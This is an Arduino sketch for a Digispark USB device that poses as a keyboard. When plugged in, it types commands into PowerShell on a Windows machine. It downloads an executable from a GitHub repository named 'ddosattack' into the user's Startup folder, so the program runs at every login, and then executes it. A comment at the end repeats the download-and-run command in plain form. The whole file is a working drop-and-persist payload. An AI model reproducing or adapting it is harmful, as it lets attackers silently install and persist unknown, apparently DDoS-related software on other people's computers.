#include <DigiKeyboard.h>

void setup() {
  //line 5-15 launches powershell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print("cd ");
  DigiKeyboard.sendKeyStroke(0x1F, MOD_SHIFT_LEFT); //Goosefeet
  DigiKeyboard.print("AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
  DigiKeyboard.sendKeyStroke(0x1F, MOD_SHIFT_LEFT); //Goosefeet
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //line 18-21 downloads the .exe file
  DigiKeyboard.print("Invoke/WebRequest /Uri https>&&raw.githubusercontent.com&Fred/the/bot&ddosattack&master&main.exe /OutFile .");
  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("main.exe<");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //line 23-28 launches the exe file and closes the powershell window
  DigiKeyboard.print(".");
  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("main.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {

}

//https://www.medo64.com/2021/09/add-application-to-auto-start-from-powershell/
//$PWD.path

// Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/ddosattack/master/main.exe -OutFile .\main.exe;
//.\main.exe


// remove the 5 sec delay that is present when inserted into computer
